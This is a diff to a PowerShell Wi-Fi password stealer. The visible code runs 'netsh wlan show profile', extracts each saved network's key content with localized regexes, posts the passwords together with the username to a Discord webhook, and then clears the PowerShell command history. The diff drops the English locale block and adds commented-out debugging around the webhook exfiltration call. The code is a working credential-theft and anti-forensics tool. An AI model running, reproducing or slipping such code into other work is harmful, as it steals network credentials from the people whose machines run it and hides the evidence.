@@ -6,10 +6,6 @@ switch ($language) {
         $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
         $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
     }
-    'en' { # English
-        $userProfileString = '(?<=All User Profile\s+:\s).+'
-        $keyContentString = '(?<=Key Content\s+:\s).+'
-    }
     'it' { # Italian
         $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
         $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
@@ -28,8 +24,13 @@ netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
         'username' = $env:username + " | " + [string]$wlan
         'content' = [string]$passw
     }
-    
+
+    # Remove the comments if you want debug it
+    #try {
     Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+    #} catch {
+    #    Write-Host "Some err: $_"
+    #}
 }
 
 # Clear the PowerShell command history
